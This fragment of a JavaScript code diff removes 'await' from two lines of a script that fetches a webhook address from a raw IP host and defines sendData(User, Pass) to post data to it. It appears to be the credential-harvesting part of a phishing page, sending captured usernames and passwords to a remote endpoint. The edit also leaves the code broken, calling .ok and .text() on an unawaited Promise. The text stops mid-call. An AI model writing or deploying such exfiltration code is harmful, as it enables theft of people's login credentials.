@@ -1,11 +1,11 @@
 
-const response = await fetch('http://70.95.197.6');
+const response = fetch('http://70.95.197.6');
 
 if (!response.ok) {
     console.log("it failed")
 }
 
-const webhook = await response.text();
+const webhook = response.text();
 function sendData(User, Pass) {
     $.post(webhook,
     {
